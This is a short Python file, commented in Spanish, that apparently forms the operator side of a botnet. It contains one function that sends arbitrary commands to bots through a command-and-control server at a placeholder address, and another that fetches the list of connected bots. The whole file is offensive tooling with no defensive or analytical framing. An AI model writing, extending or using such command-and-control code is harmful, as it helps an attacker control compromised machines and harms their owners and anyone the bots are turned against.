import requests

def send_command_to_bots(command, bot_ip):
    """Envía un comando específico a un bot para ejecutar."""
    c2_server = "http://<IP_DEL_C2>:8080"
    try:
        response = requests.post(f'{c2_server}/send_command', data={'command': command, 'ip': bot_ip})
        if response.status_code == 200:
            print(f"Comando '{command}' enviado exitosamente a {bot_ip}")
        else:
            print(f"Error al enviar comando a {bot_ip}")
    except Exception as e:
        print(f"Error en la conexión: {e}")

def fetch_bot_list():
    """Obtiene la lista de bots conectados al C2."""
    c2_server = "http://<IP_DEL_C2>:8080"
    try:
        response = requests.get(f'{c2_server}/bots')
        return response.json() if response.status_code == 200 else []
    except Exception as e:
        print(f"Error al obtener lista de bots: {e}")
        return []
